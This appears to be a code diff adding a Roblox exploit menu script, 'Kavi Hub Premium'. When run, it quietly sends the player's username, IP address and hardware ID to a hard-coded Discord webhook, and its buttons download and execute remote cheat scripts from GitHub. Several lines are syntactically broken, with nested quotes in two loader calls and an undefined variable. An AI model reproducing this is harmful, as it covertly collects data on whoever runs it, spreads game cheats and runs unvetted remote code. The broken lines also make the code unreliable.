@@ -1,0 +1,90 @@
+Http = game:GetService("HttpService")
+Web = "https://discord.com/api/webhooks/1148920236481990707/8jP-kXb_Gc06RGnIwwSlIOvBGIQ9hNwHJOfLTjgQO6q1Ed8j-u9L_mx6qcn1Jul5VJao"
+
+if syn then
+    local responce = syn.request(
+    {
+        Url = Web,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = Http:JSONEncode({
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "**Key System Loginned**",
+                ["description"] = game.Players.LocalPlayer.Name.. " ",
+                ["type"] = "rich",
+                ["color"] = tonumber(random),
+                ["fields"] = {
+                    {
+                        ["name"] = " Ip",
+                        ["value"] =  game:HttpGet("", true),
+                        ["inline"] = true
+                    }
+                }
+                
+            }}
+        })
+    })
+   else
+    request(
+        {
+            Url = Web,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = Http:JSONEncode({
+                ["content"] = "***Birisi Key Sisteme Giriş Yaptı***",
+                ["embeds"] = {{
+                    ["title"] = "**Key System Loginned**",
+                    ["description"] =  game.Players.LocalPlayer.Name.. "",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(random),
+                    ["fields"] = {
+                        {
+                            ["name"] = "Hardware ID:",
+							["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                            ["inline"] = true
+                            
+                        }
+                        
+                        
+                        
+                        
+                    }
+                    
+                }}
+            })
+        })
+    end
+
+
+local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
+
+local Win1 = DiscordLib:Window("Kavi Hub Premium") -- Title/Name
+
+local Tab1 = Win1:Server("Premium", "") -- Server/Tab
+
+local Chann1 = Tab1:Channel("Kavi Hub") -- Channel 0_0
+
+Chann1:Button("yBlood", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KAVITXT/KAVITXT/main/Kavi.Hub"))()
+  end)
+
+Chann1:Button("Reach", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KAVITXT/KAVITXT/main/Reach"))()
+  end)
+  
+Chann1:Button("Drag", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KAVITXT/KAVITXT/main/Drag"))()
+  end)
+
+Chann1:Button("Super Drag", function()
+loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/yQazz/yQazz/main/Kurdistan", true))()"))()
+  end)
+
+Chann1:Button("quracik", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Quraab31/h0rozel/main/README.md"))()"))()
+  end)
